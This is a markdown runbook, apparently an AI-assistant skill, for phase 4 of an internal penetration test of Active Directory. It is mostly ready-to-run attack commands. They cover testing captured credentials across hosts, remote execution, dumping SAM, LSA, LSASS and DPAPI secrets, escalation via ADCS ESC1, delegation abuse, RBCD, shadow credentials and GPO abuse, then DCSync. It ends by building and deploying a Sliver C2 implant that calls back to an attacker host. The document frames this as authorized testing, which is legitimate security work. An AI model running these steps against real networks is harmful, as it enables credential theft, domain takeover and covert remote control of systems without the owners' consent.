# Phase 4: Lateral Movement & Privilege Escalation

## Purpose
Lateral movement using captured credentials, privilege escalation toward Domain Admin, credential dumping, and C2 deployment.

## When to Use
- Phase 4 of internal engagement
- User has compromised credentials and needs to move laterally
- User asks about privilege escalation, credential dumping, or C2
- Need to demonstrate domain compromise impact

---

## Prerequisites

- At least one compromised domain account (from Phase 3)
- Network map and target list (from Phase 1)
- BloodHound attack paths identified (from Phase 2)

---

## Workflow

### Step 1: Validate Credential Access

```bash
# Test credential against all hosts - SMB
netexec smb targets/live-hosts.txt -u '[USER]' -p '[PASS]' --continue-on-success 2>&1 | tee outputs/netexec/access_smb.txt

# Filter for admin access (Pwn3d!)
grep "Pwn3d" outputs/netexec/access_smb.txt

# Test WinRM access
netexec winrm targets/live-hosts.txt -u '[USER]' -p '[PASS]' --continue-on-success 2>&1 | tee outputs/netexec/access_winrm.txt

# Test RDP access
netexec rdp targets/live-hosts.txt -u '[USER]' -p '[PASS]' --continue-on-success 2>&1 | tee outputs/netexec/access_rdp.txt

# Pass-the-hash variant
netexec smb targets/live-hosts.txt -u '[USER]' -H [NTLM_HASH] --continue-on-success
```

**Document**: Which hosts each credential has admin access on → Notes.md compromised accounts table

---

### Step 2: Remote Execution

Choose the appropriate method based on available access:

#### WMIExec (Preferred - minimal forensic artifacts)
```bash
impacket-wmiexec '[DOMAIN]/[USER]:[PASS]@[TARGET]'
# Or with hash
impacket-wmiexec -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[TARGET]'
```

#### Evil-WinRM (If port 5985 open)
```bash
evil-winrm -i [TARGET] -u '[USER]' -p '[PASS]'
# Or with hash
evil-winrm -i [TARGET] -u '[USER]' -H [NTLM_HASH]
```

#### PSExec (Creates service - noisier)
```bash
impacket-psexec '[DOMAIN]/[USER]:[PASS]@[TARGET]'
```

#### SMBExec (Uses SMB - moderate noise)
```bash
impacket-smbexec '[DOMAIN]/[USER]:[PASS]@[TARGET]'
```

#### NetExec Command Execution
```bash
# Single command via SMB
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -x 'whoami /all'

# Single command via WinRM
netexec winrm [TARGET] -u '[USER]' -p '[PASS]' -x 'whoami /all'

# PowerShell command
netexec winrm [TARGET] -u '[USER]' -p '[PASS]' -X 'Get-Process'
```

---

### Step 3: Credential Dumping

#### SAM + LSA Secrets (Local accounts)
```bash
# Full dump (SAM + LSA + cached creds)
impacket-secretsdump '[DOMAIN]/[USER]:[PASS]@[TARGET]' 2>&1 | tee outputs/impacket/secretsdump_[TARGET]_$(date +%Y%m%d_%H%M%S).txt

# NetExec alternatives
netexec smb [TARGET] -u '[USER]' -p '[PASS]' --sam        # SAM hashes
netexec smb [TARGET] -u '[USER]' -p '[PASS]' --lsa        # LSA secrets
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M lsassy    # LSASS memory
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M nanodump  # LSASS minidump
```

#### LSASS Process Memory
```bash
# Lsassy (preferred - multiple dump methods)
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M lsassy 2>&1 | tee outputs/netexec/lsassy_[TARGET].txt

# Nanodump
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M nanodump 2>&1 | tee outputs/netexec/nanodump_[TARGET].txt
```

#### DPAPI Secrets
```bash
# Browser passwords, WiFi keys, etc.
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M dpapi 2>&1 | tee outputs/netexec/dpapi_[TARGET].txt
```

#### Mass Credential Dump
```bash
# Dump SAM from all admin-accessible hosts
netexec smb targets/live-hosts.txt -u '[USER]' -p '[PASS]' --sam 2>&1 | tee outputs/netexec/mass_sam_dump.txt

# Dump LSA from all admin-accessible hosts
netexec smb targets/live-hosts.txt -u '[USER]' -p '[PASS]' --lsa 2>&1 | tee outputs/netexec/mass_lsa_dump.txt
```

**Track all new credentials** in Notes.md compromised accounts table.

---

### Step 4: Privilege Escalation

Follow BloodHound attack paths from Phase 2. Priority order:

#### 4a. ADCS Exploitation (ESC1 - Most Common)
```bash
# Request certificate as administrator
certipy req -u '[USER]@[DOMAIN]' -p '[PASS]' -ca [CA_NAME] -template [VULN_TEMPLATE] -upn administrator@[DOMAIN] -dc-ip [DC_IP]

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]

# Result: NT hash for administrator account
```

#### 4b. Unconstrained Delegation
```bash
# Identify unconstrained delegation hosts (if not found in BloodHound)
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' --trusted-for-delegation

# Coerce DC to authenticate to unconstrained delegation host
# Using PetitPotam
python3 PetitPotam.py [UNCONSTRAINED_HOST] [DC_IP]

# Using PrinterBug
python3 printerbug.py '[DOMAIN]/[USER]:[PASS]@[DC_IP]' [UNCONSTRAINED_HOST]

# Capture TGT with Rubeus (on the unconstrained host)
# Rubeus.exe monitor /interval:5 /nowrap
```

#### 4c. Constrained Delegation
```bash
# S4U2Self + S4U2Proxy
impacket-getST -spn '[SPN]' -impersonate Administrator '[DOMAIN]/[USER]:[PASS]' -dc-ip [DC_IP]

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass [TARGET]
```

#### 4d. Resource-Based Constrained Delegation (RBCD)
```bash
# Check MAQ (need > 0)
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' -M maq

# Create machine account
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password123!' -dc-ip [DC_IP] '[DOMAIN]/[USER]:[PASS]'

# Set RBCD
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '[TARGET]$' -action write '[DOMAIN]/[USER]:[PASS]' -dc-ip [DC_IP]

# Get service ticket
impacket-getST -spn 'cifs/[TARGET].[DOMAIN]' -impersonate Administrator '[DOMAIN]/EVIL$:Password123!' -dc-ip [DC_IP]

# Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass [TARGET].[DOMAIN]
```

#### 4e. Shadow Credentials
```bash
# Add shadow credential (need GenericWrite on target)
certipy shadow auto -u '[USER]@[DOMAIN]' -p '[PASS]' -account '[TARGET_USER]' -dc-ip [DC_IP]

# Result: NT hash for target account
```

#### 4f. GPO Abuse
```bash
# If WriteDACL/GenericAll on GPO linked to privileged users
# Use pyGPOAbuse
python3 pygpoabuse.py '[DOMAIN]/[USER]:[PASS]' -gpo-id '[GPO_ID]' -command 'net localgroup Administrators [USER] /add' -dc-ip [DC_IP]
```

#### 4g. ForceChangePassword
```bash
# If have ForceChangePassword right on target user
net rpc password '[TARGET_USER]' 'NewPassword123!' -U '[DOMAIN]/[USER]%[PASS]' -S [DC_IP]
```

---

### Step 5: DCSync (Domain Admin Achieved)

```bash
# Full DCSync - all hashes
impacket-secretsdump -just-dc '[DOMAIN]/[USER]:[PASS]@[DC_IP]' 2>&1 | tee outputs/impacket/dcsync_$(date +%Y%m%d_%H%M%S).txt

# NTLM hashes only (faster)
impacket-secretsdump -just-dc-ntlm '[DOMAIN]/[USER]:[PASS]@[DC_IP]' 2>&1 | tee outputs/impacket/dcsync_ntlm.txt

# Specific user only
impacket-secretsdump -just-dc-user Administrator '[DOMAIN]/[USER]:[PASS]@[DC_IP]'

# Verify DA with krbtgt hash
impacket-secretsdump -just-dc-user krbtgt '[DOMAIN]/[USER]:[PASS]@[DC_IP]'
```

**DCSync success = full domain compromise demonstrated.**

---

### Step 6: Sliver C2 Deployment (If Authorized)

#### Setup Sliver Server
```bash
# Start Sliver (interactive)
sliver

# Generate implant
sliver > generate --mtls [ATTACKER_IP] --os windows --arch amd64 --save outputs/sliver/implant.exe

# For stealth, use stager
sliver > generate stager --lhost [ATTACKER_IP] --lport 8443 --protocol tcp --save outputs/sliver/stager.bin

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888
```

#### Deploy
```bash
# Upload implant via SMB
impacket-smbclient '[DOMAIN]/[USER]:[PASS]@[TARGET]'
# > put outputs/sliver/implant.exe

# Execute via WMI
impacket-wmiexec '[DOMAIN]/[USER]:[PASS]@[TARGET]' 'C:\implant.exe'

# Or via NetExec
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -x 'C:\implant.exe'
```

#### Post-Exploitation via Sliver
```bash
sliver > sessions            # List active sessions
sliver > use [SESSION_ID]    # Interact with session
sliver > getuid              # Current user
sliver > getprivs            # Current privileges
sliver > ps                  # Process listing
sliver > netstat             # Network connections
sliver > ifconfig            # Network interfaces
sliver > hashdump            # Dump SAM hashes
sliver > screenshot          # Take screenshot
```

---

## Attack Path Documentation

Document the complete attack chain in Notes.md:

```markdown
## Attack Path

1. **Initial Access**: Responder captured NTLMv2 hash for jsmith (Phase 3)
2. **Hash Cracked**: jsmith:P@ssw0rd! via hashcat (Phase 3)
3. **Local Admin**: jsmith has admin on WS01, WS02 (Phase 4)
4. **Credential Dump**: secretsdump on WS01 → svc_backup NTLM hash (Phase 4)
5. **Lateral Movement**: svc_backup has admin on FILE01 (Phase 4)
6. **Privilege Escalation**: ADCS ESC1 → Administrator certificate (Phase 4)
7. **Domain Compromise**: DCSync with Administrator hash (Phase 4)
```

---

## Deliverables

| File | Contents |
|------|----------|
| `outputs/impacket/secretsdump_*.txt` | Credential dumps |
| `outputs/impacket/dcsync_*.txt` | DCSync output |
| `outputs/netexec/access_*.txt` | Credential validation |
| `outputs/netexec/lsassy_*.txt` | LSASS dumps |
| `outputs/sliver/` | C2 implants and session logs |
| Updated Notes.md | Complete attack path, compromised accounts |

---

## Transition to Phase 5

When complete:
1. Lateral movement demonstrated with evidence
2. Privilege escalation path documented
3. Domain compromise achieved (or furthest point documented)
4. All credentials and access documented
5. Attack chain fully recorded

**Next**: Proceed to `Workflows/PostExploitation.md` (Phase 5)
